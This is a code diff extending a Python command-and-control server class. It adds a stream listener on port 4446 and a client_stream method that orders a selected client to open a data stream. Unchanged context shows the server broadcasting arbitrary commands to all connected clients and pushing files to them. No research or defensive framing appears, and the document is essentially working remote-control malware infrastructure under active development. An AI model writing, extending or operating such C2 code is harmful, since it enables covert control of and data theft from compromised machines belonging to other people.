@@ -7,10 +7,11 @@ from server_core.acceptor import accept_loop
 
 
 class C2Server:
-    def __init__(self, host='0.0.0.0', command_port=4444, heartbeat_port=4445):
+    def __init__(self, host='0.0.0.0', command_port=4444, heartbeat_port=4445, stream_port=4446):
         self.host = host
         self.command_port = command_port
         self.heartbeat_port = heartbeat_port
+        self.stream_port=stream_port
 
         self.clients = {}
         self.lock = threading.Lock()
@@ -35,11 +36,16 @@ class C2Server:
         server.bind((self.host, self.command_port))
         server.listen(50)
 
-        self.log(f"[*] Server listening on {self.command_port}")
+        stream = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        stream.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        stream.bind((self.host, self.stream_port))
+        stream.listen(50)
+
+        self.log(f"[*] Server listening for commands on {self.command_port}, stream port: {self.stream_port}")
 
         threading.Thread(
             target=accept_loop,
-            args=(self, server),
+            args=(self, server, stream),
             daemon=True
         ).start()
 
@@ -63,7 +69,7 @@ class C2Server:
                 if not client.active:
                     continue
                 try:
-                    client.socket.send((command + '\n').encode())
+                    client.cmd_socket.send((command + '\n').encode())
                     client.set_time(time.time())
                 except Exception as e:
                     self.log(f"[!] Send failed to {client.ip}: {e}")
@@ -78,10 +84,24 @@ class C2Server:
 
         with target.lock:
             try:
-                target.socket.send((command + '\n').encode())
+                target.cmd_socket.send((command + '\n').encode())
                 target.set_time(time.time())
             except Exception:
                 target.close()
+
+    def client_stream(self, uid_prefix):
+        target = self.find_client_by_prefix(uid_prefix)
+        if not target:
+            self.log("[ERR] Client not found or ambiguous")
+            return
+
+        with target.lock:
+            try:
+                target.cmd_socket.send(('STREAM|4446' + '\n').encode())
+                target.set_time(time.time())
+            except Exception:
+                target.close()
+
 
     def find_client_by_prefix(self, uid_prefix:str):
         with self.lock:
@@ -120,7 +140,7 @@ class C2Server:
         self.log(content[:65].hex())
         with target.lock:
             try:
-                target.socket.sendall(command)
+                target.cmd_socket.sendall(command)
                 target.set_time(time.time())
                 self.log(f"Sent {source_path} to {target.unique_id[:8]}...")
             except Exception as e:
@@ -145,6 +165,6 @@ class C2Server:
                     state = "ACTIVE" if client.active else "INACTIVE"
                     idle = int(time.time() - client.last_seen)
                     self.log(
-                        f"{client.unique_id} -> {client.ip}:{client.port} "
+                        f"{client.unique_id} -> {client.ip}:{client.cmd_port} "
                         f"State: {state}; idle:{idle}s; HeartBeat port:{client.heartbeat_port}"
                     )
